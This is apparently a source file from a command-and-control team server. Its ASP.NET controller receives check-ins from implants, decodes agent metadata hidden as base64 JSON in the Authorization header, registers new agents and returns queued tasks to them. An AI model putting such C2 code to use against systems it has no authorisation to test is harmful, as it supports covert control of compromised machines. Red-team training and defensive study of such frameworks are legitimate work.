using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using TeamServer.Models.Agents;
using TeamServer.Services;
using System;
using Newtonsoft.Json;
using System.Text;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private readonly IAgentService _agents;

        public HttpListenerController(IAgentService agents)
        {
            _agents = agents;
        }

        public IActionResult HandleImplant()
        {
            var metadata = ExtractMetada(HttpContext.Request.Headers);
            if (metadata is null) return NotFound();

            var agent = _agents.GetAgent(metadata.Id);

            if (agent is null)
            {
                agent = new Agent(metadata);
                _agents.AddAgent(agent);
            }

            agent.CheckIn();

            var tasks = agent.GetPendingTasks();
            return Ok(tasks);
        }

        private AgentMetadata ExtractMetada(IHeaderDictionary headers)
        {
            if (!headers.TryGetValue("Authorization", out var encodeMetadata))
                return null;

            // Authorization: Bearer <base64>
            encodeMetadata = encodeMetadata.ToString().Remove(0, 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodeMetadata));
            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }
    }
}
